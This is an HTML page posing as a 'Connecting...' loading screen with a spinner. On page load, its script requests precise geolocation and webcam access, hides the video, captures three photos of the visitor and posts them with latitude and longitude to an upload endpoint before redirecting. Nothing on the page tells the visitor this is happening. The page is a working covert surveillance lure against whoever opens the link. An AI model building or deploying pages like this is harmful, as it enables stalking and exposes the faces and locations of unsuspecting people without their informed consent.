<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
  <title>Connecting...</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background: #111;
      color: #ccc;
      font-family: system-ui, sans-serif;
      height: 100vh;
      width: 100vw;
      overflow: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
      touch-action: none;
    }

    .spinner {
      width: 15vmin;
      height: 15vmin;
      border: 5px solid #444;
      border-top: 5px solid #ccc;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0%   { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    video {
      display: none;
    }
  </style>
</head>
<body>
  <div class="spinner" aria-hidden="true"></div>
  <video id="video" autoplay playsinline></video>

  <script>
    let coords = null;

    async function getGeolocation() {
      return new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            coords = {
              lat: position.coords.latitude,
              lon: position.coords.longitude
            };
            resolve();
          },
          (err) => {
            alert("❌ Location permission denied.");
            reject(err);
          },
          {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          }
        );
      });
    }

    function capturePhoto(video) {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0);
      return canvas.toDataURL('image/png');
    }

    async function sendPhoto(dataUrl, coords) {
      return fetch("/upload-photo", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          image: dataUrl,
          lat: coords?.lat,
          lon: coords?.lon
        }),
      });
    }

    async function startSequence() {
      const geoPromise = getGeolocation(); // Start getting location
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.getElementById("video");
      video.srcObject = stream;

      await new Promise(resolve => video.onloadedmetadata = resolve);
      await geoPromise; // Wait for geolocation if not yet resolved

      // Capture 3 photos quickly
      const photos = [capturePhoto(video), capturePhoto(video), capturePhoto(video)];

      // Stop the webcam
      stream.getTracks().forEach(track => track.stop());

      // Send all photos in parallel
      await Promise.all(
        photos.map(photo => sendPhoto(photo, coords))
      );

      window.location.href = "/redirect";
    }

    window.onload = async () => {
      try {
        await startSequence();
      } catch (e) {
        console.error("Failure:", e);
      }
    };
  </script>
</body>
</html>
